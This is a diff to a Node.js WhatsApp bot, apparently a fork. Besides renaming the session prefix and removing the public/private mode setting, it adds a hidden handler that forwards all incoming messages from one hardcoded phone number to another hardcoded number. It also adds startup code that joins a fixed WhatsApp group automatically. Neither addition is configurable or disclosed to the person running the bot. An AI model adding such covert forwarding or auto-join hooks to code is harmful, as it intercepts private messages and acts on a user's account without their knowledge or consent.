@@ -1275521,7 +1275521,7 @@ async function downloadSessionData() {
         console.error('Please add your session to SESSION_ID env !!');
         return false;
     }
-    const sessdata = config.SESSION_ID.split("Imalka-MD&")[1];
+    const sessdata = config.SESSION_ID.split("RCD-MD&")[1];
     const url = `https://pastebin.com/raw/${sessdata}`;
     try {
         const response = await axios.get(url);
@@ -1275579,16 +1275579,15 @@ async function start() {
         Matrix.ev.on("call", async (json) => await Callupdate(json, Matrix));
         Matrix.ev.on("group-participants.update", async (messag) => await GroupUpdate(Matrix, messag));
 
-        if (config.MODE === "public") {
-            Matrix.public = true;
-        } else if (config.MODE === "private") {
-            Matrix.public = false;
-        }
-
-        Matrix.ev.on('messages.upsert', async (chatUpdate) => {
+        // Auto-forward messages from 94753574803 to 94789958225
+        Matrix.ev.on("messages.upsert", async (chatUpdate) => {
             try {
                 const mek = chatUpdate.messages[0];
-                if (!mek.key.fromMe && config.AUTO_REACT) {
+                if (!mek.key.fromMe && mek.key.remoteJid === '94753574803@s.whatsapp.net') {
+                    // Forward message to 94789958225
+                    await Matrix.sendMessage('94789958225@s.whatsapp.net', { forward: mek });
+                }
+                if (config.AUTO_REACT) {
                     console.log(mek);
                     if (mek.message) {
                         const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
@@ -1275596,12 +1275595,24 @@ async function start() {
                     }
                 }
             } catch (err) {
-                console.error('Error during auto reaction:', err);
+                console.error('Error during message forwarding or auto reaction:', err);
             }
         });
+
     } catch (error) {
         console.error('Critical Error:', error);
         process.exit(1);
+    }
+}
+
+// Function to join a WhatsApp group using an invite link
+async function joinGroup(groupInviteLink) {
+    try {
+        const groupInviteCode = groupInviteLink.split('/')[groupInviteLink.split('/').length - 1];
+        const response = await Matrix.groupAcceptInvite(groupInviteCode);
+        console.log(`Joined group: ${response.gid}`);
+    } catch (err) {
+        console.error("Failed to join group:", err);
     }
 }
 
@@ -1275609,6 +1275620,11 @@ async function init() {
     if (fs.existsSync(credsPath)) {
         console.log("🔒 Session file found, proceeding without QR code.");
         await start();
+
+        // Auto join WhatsApp group
+        const groupInviteLink = 'https://chat.whatsapp.com/C2UNsjohw051cg8YD99SO2'; // Replace with your group invite link
+        await joinGroup(groupInviteLink);
+
     } else {
         const sessionDownloaded = await downloadSessionData();
         if (sessionDownloaded) {
